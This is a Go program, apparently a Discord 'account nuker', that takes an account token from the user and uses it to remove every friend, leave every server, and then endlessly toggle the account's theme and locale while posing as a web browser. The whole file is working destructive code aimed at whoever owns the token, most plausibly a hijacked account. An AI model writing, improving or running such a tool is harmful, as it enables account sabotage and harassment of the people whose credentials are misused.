package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func getAllGuildsWorker(Session *discordgo.Session) (guildIds []string) {
	for _, guild := range Session.State.Guilds {
		guildIds = append(guildIds, guild.ID)
	}

	return guildIds
}

func getAllFriendsWorker(Session *discordgo.Session) (friendIDS []string, err error) {
	if relationships, err := Session.RelationshipsGet(); err == nil {
		for _, friend := range relationships {
			friendIDS = append(friendIDS, friend.ID)
		}

		return friendIDS, nil
	}

	return nil, err
}

func iterateSettingsWorker(s *discordgo.Session) {
	themes := []string{"light", "dark"}
	locales := []string{"ja", "zh-TW", "ko", "zh-CN"}
	for _, theme := range themes {
		for _, locale := range locales {
			var payload = []byte(fmt.Sprintf(`{"theme": "%v", "locale": "%v"}`, theme, locale))
			req, err := http.NewRequest("PATCH", "https://discord.com/api/v6/users/@me/settings", bytes.NewBuffer(payload))
			req.Header.Set("Authorization", s.Token)
			req.Header.Set("Content-Type", "application/json")

			if err != nil {
				fmt.Println("[\u001b[31m-\u001b[0m] := Error iterating user settings,", err)
			}

			client := &http.Client{}
			_, err = client.Do(req)

			if err != nil {
				fmt.Println("[\u001b[31m-\u001b[0m] := Error performing request,", err)
			}
		}
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[\u001b[32m>\u001b[0m] Enter token : ")
	token, _ := reader.ReadString('\n')

	if s, err := discordgo.New(strings.TrimSpace(token)); err == nil {
		s.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"

		friendList, err := getAllFriendsWorker(s)
		if err != nil {
			fmt.Println("retrieving friend list:", err)
		}
		guildsList := getAllGuildsWorker(s)

		for _, friend := range friendList {
			if err := s.RelationshipDelete(friend); err == nil {
				fmt.Println("[\u001b[32m+\u001b[0m] Relationship removed: " + friend)
			}
		}

		for _, guild := range guildsList {
			if err := s.GuildLeave(guild); err == nil {
				fmt.Println("[\u001b[32m+\u001b[0m] Guild left: " + guild)
			}
			fmt.Println("[\u001b[31m-\u001b[0m] Error leaving guild,", err)
		}

		for true {
			iterateSettingsWorker(s)
		}
	}
}
